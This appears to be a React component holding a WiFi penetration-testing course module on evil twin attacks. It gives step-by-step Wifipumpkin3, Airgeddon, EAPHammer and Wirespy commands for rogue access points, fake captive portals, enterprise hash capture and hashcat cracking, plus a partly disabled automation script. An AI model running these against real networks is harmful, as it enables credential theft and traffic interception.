import { Skull, AlertTriangle, Info, Wifi, Globe, Shield, Lock } from "lucide-react";
import { CommandBlock } from "../CommandBlock";
import { ScriptBlock } from "../ScriptBlock";

export const AdvancedEvilTwin = () => {
  const wifipumpkinScript = `#!/bin/bash
# 2027 edition: historical automation disabled; fails before any state change.
printf 'Disabled review artifact. Use synthetic practice; no RF action permitted.\\n' >&2
exit 64

# Wifipumpkin3 Automated Evil Twin Script
# Usage: sudo bash run_wifipumpkin3.sh <ssid> <interface>

set -e

SSID=\${1:-"FreeWiFi"}
INTERFACE=\${2:-wlan1}

echo "=========================================="
echo "   Wifipumpkin3 Evil Twin Setup"
echo "=========================================="
echo ""

# Install if needed
if ! command -v wifipumpkin3 &>/dev/null; then
    echo "[*] Installing Wifipumpkin3..."
    sudo apt install -y wifipumpkin3 2>/dev/null || {
        cd /opt
        sudo git clone https://github.com/P0cL4bs/wifipumpkin3.git
        cd wifipumpkin3
        sudo pip3 install -r requirements.txt
        sudo python3 setup.py install
    }
fi

# Create pulp script for automated setup
cat > /tmp/wp3_script.pulp << EOF
set interface \$INTERFACE
set ssid \$SSID
set proxy noproxy
set dhcp.netmask 255.255.255.0
set dhcp.range 10.0.0.10/10.0.0.50
set dhcp.router 10.0.0.1
ignore pydns_server
set captiveflask.force_redirect_to_captive_portal true
start
EOF

echo "[*] Starting Wifipumpkin3 with SSID: \$SSID"
echo "[*] Interface: \$INTERFACE"
echo "[!] Press Ctrl+C to stop"
echo ""

sudo wifipumpkin3 --pulp /tmp/wp3_script.pulp`;

  return (
    <section className="py-16">
      <div className="container mx-auto px-4">
        <div className="max-w-4xl mx-auto">
          <div className="flex items-center gap-3 mb-6">
            <div className="w-10 h-10 rounded-lg bg-primary/20 flex items-center justify-center">
              <Skull className="w-5 h-5 text-primary" />
            </div>
            <div>
              <span className="text-xs font-mono text-primary">MODULE 12</span>
              <h2 className="text-2xl font-bold text-foreground">Advanced Evil Twin & Captive Portals</h2>
            </div>
          </div>

          <p className="text-muted-foreground mb-8">
            Building on Module 06's manual evil twin setup, this module covers professional-grade tools: 
            Wifipumpkin3, Airgeddon, EAPHammer, and Wirespy. These frameworks automate complex rogue AP attacks 
            with built-in credential capture, MITM proxies, and enterprise WiFi exploitation.
          </p>

          {/* Legal Warning */}
          <div className="p-4 rounded-lg border border-destructive/50 bg-destructive/10 mb-8">
            <div className="flex items-start gap-3">
              <AlertTriangle className="w-5 h-5 text-destructive flex-shrink-0 mt-0.5" />
              <div>
                <h4 className="font-medium text-destructive mb-1">Critical Legal Warning</h4>
                <p className="text-sm text-muted-foreground">
                  These tools intercept credentials and traffic. Using them without authorization constitutes 
                  wire fraud and computer fraud. Only use in authorized penetration tests.
                </p>
              </div>
            </div>
          </div>

          {/* Wifipumpkin3 */}
          <div className="p-5 rounded-xl border border-border bg-card mb-8">
            <h3 className="font-semibold text-foreground mb-3 flex items-center gap-2">
              <Globe className="w-5 h-5 text-accent" />
              Wifipumpkin3 — Rogue AP Framework
            </h3>
            <div className="space-y-3 text-sm text-muted-foreground">
              <p>
                <strong className="text-foreground">What is Wifipumpkin3?</strong> A powerful framework for rogue AP 
                attacks. Features built-in DHCP, DNS spoofing, captive portals, proxy plugins, credential sniffing, 
                and a scriptable CLI. The spiritual successor to MITMf.
              </p>
              <p>
                <strong className="text-foreground">Key Features:</strong> Custom captive portal templates, SSL stripping, 
                DNS spoofing, JavaScript injection, credential logging, Responder integration, and .pulp scripting 
                for automation.
              </p>
            </div>
          </div>

          <h3 className="text-lg font-semibold text-foreground mb-4">Wifipumpkin3 Setup & Usage</h3>
          <div className="space-y-4 mb-8">
            <CommandBlock
              command="sudo apt install -y wifipumpkin3"
              description="Step 1: Install Wifipumpkin3"
              explanation="Available in Kali repos. Alternative: clone from GitHub for latest version."
            />
            <CommandBlock
              command="sudo wifipumpkin3"
              description="Step 2: Launch interactive console"
              explanation="Opens the wp3 console with tab completion. Configure settings before starting the rogue AP."
              output={`
██╗    ██╗██████╗ ██████╗ 
██║    ██║██╔══██╗╚════██╗
██║ █╗ ██║██████╔╝ █████╔╝
██║███╗██║██╔═══╝  ╚═══██╗
╚███╔███╔╝██║     ██████╔╝
 ╚══╝╚══╝ ╚═╝     ╚═════╝ v1.1.4

wp3 > `}
            />
            <CommandBlock
              command="wp3 > set interface wlan1"
              description="Step 3: Set wireless interface"
              explanation="Point wp3 to your Alfa adapter. Must be in managed mode — wp3 handles AP creation."
            />
            <CommandBlock
              command="wp3 > set ssid 'CompanyWiFi'"
              description="Step 4: Set rogue AP SSID"
              explanation="Match the target network name exactly. Clients with saved profiles will auto-connect."
            />
            <CommandBlock
              command="wp3 > set proxy captiveflask"
              description="Step 5: Enable captive portal proxy"
              explanation="CaptiveFlask serves fake login pages. Other options: noproxy, sslstrip10, bdfproxy."
            />
            <CommandBlock
              command="wp3 > set captiveflask.force_redirect_to_captive_portal true"
              description="Step 6: Force captive portal redirect"
              explanation="All HTTP traffic is redirected to the captive portal login page."
            />
            <CommandBlock
              command="wp3 > start"
              description="Step 7: Start rogue AP"
              explanation="Launches hostapd, DHCP, DNS, and the captive portal. Credentials are logged to ~/.config/wifipumpkin3/logs/"
            />
            <CommandBlock
              command="wp3 > clients"
              description="View connected clients"
              explanation="Shows all devices that connected to your rogue AP with MAC, IP, hostname, and vendor."
            />
            <CommandBlock
              command="wp3 > info"
              description="View current configuration"
              explanation="Displays all active settings: SSID, interface, proxy, DHCP range, DNS, plugins."
            />
          </div>

          {/* Wifipumpkin3 Captive Portal Templates */}
          <div className="p-5 rounded-xl border border-border bg-card mb-8">
            <h3 className="font-semibold text-foreground mb-3">Captive Portal Templates</h3>
            <div className="space-y-2 text-sm text-muted-foreground">
              <p><strong className="text-foreground">login_v4</strong> — Generic WiFi login page</p>
              <p><strong className="text-foreground">DarkLogin</strong> — Dark-themed login portal</p>
              <p><strong className="text-foreground">FlaskDemo</strong> — Demo/testing template</p>
              <p><strong className="text-foreground">Custom</strong> — Create your own in ~/.config/wifipumpkin3/config/app/captive-portal/</p>
            </div>
          </div>

          {/* Airgeddon */}
          <div className="p-5 rounded-xl border border-border bg-card mb-8">
            <h3 className="font-semibold text-foreground mb-3 flex items-center gap-2">
              <Wifi className="w-5 h-5 text-primary" />
              Airgeddon — Multi-Use Wireless Auditing
            </h3>
            <div className="space-y-3 text-sm text-muted-foreground">
              <p>
                <strong className="text-foreground">What is Airgeddon?</strong> A comprehensive bash-based wireless 
                auditing framework. All-in-one menu for evil twin attacks, handshake capture, WPS attacks, DoS, 
                credential harvesting, and MITM. The Swiss Army knife of WiFi pentesting.
              </p>
              <p>
                <strong className="text-foreground">Unique Features:</strong> Integrated BeEF browser exploitation, 
                Bettercap MITM, enterprise certificate impersonation, PMKID attacks, and custom captive portals.
              </p>
            </div>
          </div>

          <h3 className="text-lg font-semibold text-foreground mb-4">Airgeddon Setup & Usage</h3>
          <div className="space-y-4 mb-8">
            <CommandBlock
              command="cd /opt && sudo git clone --depth 1 https://github.com/v1s1t0r1sh3r3/airgeddon.git && cd airgeddon"
              description="Step 1: Clone Airgeddon"
              explanation="Clone with --depth 1 for faster download. Airgeddon is a single bash script with extensive functionality."
            />
            <CommandBlock
              command="sudo bash airgeddon.sh"
              description="Step 2: Launch Airgeddon"
              explanation="Checks for all dependencies on startup and offers to install missing ones. Shows main menu."
              output={`
  ██████╗ ██╗██████╗  ██████╗ ███████╗██████╗ ██████╗  ██████╗ ███╗   ██╗
 ██╔══██╗██║██╔══██╗██╔════╝ ██╔════╝██╔══██╗██╔══██╗██╔═══██╗████╗  ██║
 ███████║██║██████╔╝██║  ███╗█████╗  ██║  ██║██║  ██║██║   ██║██╔██╗ ██║
 ██╔══██║██║██╔══██╗██║   ██║██╔══╝  ██║  ██║██║  ██║██║   ██║██║╚██╗██║
 ██║  ██║██║██║  ██║╚██████╔╝███████╗██████╔╝██████╔╝╚██████╔╝██║ ╚████║
 ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝

 1) Select interface
 2) Put interface in monitor mode
 3) Handshake/PMKID tools menu
 4) Offline WPA/WPA2 decrypt menu
 5) Evil Twin attacks menu
 6) WPS attacks menu
 7) WEP attacks menu
 8) Enterprise attacks menu
 9) DoS attacks menu
 0) Exit`}
            />
            <CommandBlock
              command="# In Airgeddon menu: 5 → 9 (Evil Twin with captive portal)"
              description="Evil Twin with Captive Portal"
              explanation="Option 5 opens Evil Twin menu. Sub-option 9 creates a rogue AP with captive portal for credential capture. Airgeddon automates hostapd, dnsmasq, DHCP, and web server."
            />
            <CommandBlock
              command="# In Airgeddon menu: 8 (Enterprise attacks)"
              description="WPA-Enterprise Attacks"
              explanation="Creates a fake RADIUS server to capture enterprise credentials. Impersonates certificates to intercept MSCHAPv2 hashes."
            />
          </div>

          {/* EAPHammer */}
          <div className="p-5 rounded-xl border border-border bg-card mb-8">
            <h3 className="font-semibold text-foreground mb-3 flex items-center gap-2">
              <Lock className="w-5 h-5 text-destructive" />
              EAPHammer — WPA-Enterprise Evil Twin
            </h3>
            <div className="space-y-3 text-sm text-muted-foreground">
              <p>
                <strong className="text-foreground">What is EAPHammer?</strong> A purpose-built tool for attacking 
                WPA-Enterprise (802.1X) networks. Creates a rogue AP with a fake RADIUS server that captures 
                MSCHAPv2 challenge-response hashes from connecting clients.
              </p>
              <p>
                <strong className="text-foreground">Why It's Critical:</strong> Corporate WiFi uses WPA-Enterprise. 
                When employees connect to your evil twin, their domain credentials (AD username/password hash) are 
                captured. These hashes can be cracked offline with hashcat.
              </p>
            </div>
          </div>

          <h3 className="text-lg font-semibold text-foreground mb-4">EAPHammer Setup & Usage</h3>
          <div className="space-y-4 mb-8">
            <CommandBlock
              command="cd /opt && sudo git clone https://github.com/s0lst1c3/eaphammer.git && cd eaphammer && sudo ./kali-setup"
              description="Step 1: Install EAPHammer"
              explanation="Clone and run the Kali setup script. Installs hostapd-mana, dnsmasq, and generates self-signed certificates."
            />
            <CommandBlock
              command="sudo python3 eaphammer --cert-wizard"
              description="Step 2: Generate fake certificates"
              explanation="Creates self-signed certificates that mimic the target organization's RADIUS cert. Important for bypassing client certificate validation."
            />
            <CommandBlock
              command="sudo python3 eaphammer -i wlan1 --auth wpa-eap --essid 'CorpWiFi' --creds"
              description="Step 3: Launch Enterprise Evil Twin"
              explanation="Creates a rogue AP with EAP authentication. --creds captures credentials when clients connect. Captures MSCHAPv2 hashes."
              output={`[*] Starting EAPHammer...
[*] Interface: wlan1
[*] SSID: CorpWiFi
[*] Auth: WPA-EAP
[*] Rogue AP is running...

[+] New client connection from 11:22:33:44:55:66
[+] Identity: DOMAIN\\jsmith
[+] MSCHAPv2 challenge-response captured!
[+] Hash: jsmith:::a1b2c3d4e5f6:0123456789abcdef0123456789abcdef:fedcba98`}
            />
            <CommandBlock
              command="sudo python3 eaphammer -i wlan1 --auth wpa-eap --essid 'CorpWiFi' --creds --negotiate balanced"
              description="Balanced negotiation mode"
              explanation="--negotiate balanced accepts multiple EAP types (PEAP, TTLS, TLS). Maximizes chance of client connection."
            />
            <CommandBlock
              command="hashcat -m 5500 captured_hashes.txt /usr/share/wordlists/rockyou.txt"
              description="Crack captured MSCHAPv2 hashes"
              explanation="Mode 5500 is NetNTLMv1/MSCHAPv2. GPU cracking is very fast for this hash type. Recovered passwords give domain access."
            />
          </div>

          {/* Wirespy */}
          <div className="p-5 rounded-xl border border-border bg-card mb-8">
            <h3 className="font-semibold text-foreground mb-3 flex items-center gap-2">
              <Shield className="w-5 h-5 text-warning" />
              Wirespy — WiFi Surveillance Framework
            </h3>
            <div className="space-y-3 text-sm text-muted-foreground">
              <p>
                <strong className="text-foreground">What is Wirespy?</strong> A Python-based tool for creating rogue 
                APs with traffic sniffing capabilities. Focuses on passive credential harvesting by monitoring 
                traffic from connected clients. Lighter weight than Wifipumpkin3.
              </p>
            </div>
          </div>

          <div className="space-y-4 mb-8">
            <CommandBlock
              command="cd /opt && sudo git clone https://github.com/AresS31/wirespy.git && cd wirespy && sudo pip3 install -r requirements.txt"
              description="Install Wirespy"
              explanation="Clone from GitHub and install Python dependencies."
            />
            <CommandBlock
              command="sudo python3 wirespy.py -i wlan1 --ssid 'FreeWiFi' --channel 6"
              description="Launch Wirespy rogue AP"
              explanation="Creates an open rogue AP and begins monitoring all traffic. Captures HTTP credentials, DNS queries, and session cookies."
            />
          </div>

          {/* Tool Comparison */}
          <div className="p-5 rounded-xl border border-border bg-card mb-8">
            <h3 className="font-semibold text-foreground mb-3">Evil Twin Framework Comparison</h3>
            <div className="overflow-x-auto">
              <table className="w-full text-sm">
                <thead>
                  <tr className="border-b border-border">
                    <th className="text-left py-2 pr-4 text-primary">Feature</th>
                    <th className="text-left py-2 pr-4 text-foreground">WP3</th>
                    <th className="text-left py-2 pr-4 text-foreground">Airgeddon</th>
                    <th className="text-left py-2 pr-4 text-foreground">EAPHammer</th>
                    <th className="text-left py-2 text-foreground">Wirespy</th>
                  </tr>
                </thead>
                <tbody className="text-muted-foreground">
                  <tr className="border-b border-border/50">
                    <td className="py-2 pr-4 font-mono text-primary">Captive Portal</td>
                    <td className="py-2 pr-4">✅</td>
                    <td className="py-2 pr-4">✅</td>
                    <td className="py-2 pr-4">❌</td>
                    <td className="py-2">❌</td>
                  </tr>
                  <tr className="border-b border-border/50">
                    <td className="py-2 pr-4 font-mono text-primary">WPA-Enterprise</td>
                    <td className="py-2 pr-4">❌</td>
                    <td className="py-2 pr-4">✅</td>
                    <td className="py-2 pr-4">✅</td>
                    <td className="py-2">❌</td>
                  </tr>
                  <tr className="border-b border-border/50">
                    <td className="py-2 pr-4 font-mono text-primary">SSL Strip</td>
                    <td className="py-2 pr-4">✅</td>
                    <td className="py-2 pr-4">✅</td>
                    <td className="py-2 pr-4">❌</td>
                    <td className="py-2">✅</td>
                  </tr>
                  <tr className="border-b border-border/50">
                    <td className="py-2 pr-4 font-mono text-primary">Scriptable</td>
                    <td className="py-2 pr-4">✅ (.pulp)</td>
                    <td className="py-2 pr-4">❌</td>
                    <td className="py-2 pr-4">✅</td>
                    <td className="py-2">❌</td>
                  </tr>
                  <tr>
                    <td className="py-2 pr-4 font-mono text-primary">Best For</td>
                    <td className="py-2 pr-4">PSK portals</td>
                    <td className="py-2 pr-4">All-in-one</td>
                    <td className="py-2 pr-4">Enterprise</td>
                    <td className="py-2">Sniffing</td>
                  </tr>
                </tbody>
              </table>
            </div>
          </div>

          {/* Automation Script */}
          <h3 className="text-lg font-semibold text-foreground mb-4 mt-8">Automation Script</h3>
          <ScriptBlock
            title="Wifipumpkin3 Automated Evil Twin"
            filename="run_wifipumpkin3.sh"
            language="bash"
            description="Automated Wifipumpkin3 rogue AP with captive portal credential capture"
            code={wifipumpkinScript}
          />
        </div>
      </div>
    </section>
  );
};
